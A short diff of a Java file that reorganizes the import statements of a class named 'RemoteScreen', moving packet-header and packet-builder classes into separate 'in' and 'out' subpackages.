@@ -12,8 +12,8 @@ import java.awt.image.DataBufferByte;
 
 import com.redpois0n.common.compress.GZip;
 import com.redpois0n.common.crypto.Crypto;
-import com.redpois0n.packets.Header;
-import com.redpois0n.packets.PacketBuilder;
+import com.redpois0n.packets.in.PacketBuilder;
+import com.redpois0n.packets.out.Header;
 import com.redpois0n.utils.ImageUtils;
 
 public class RemoteScreen {
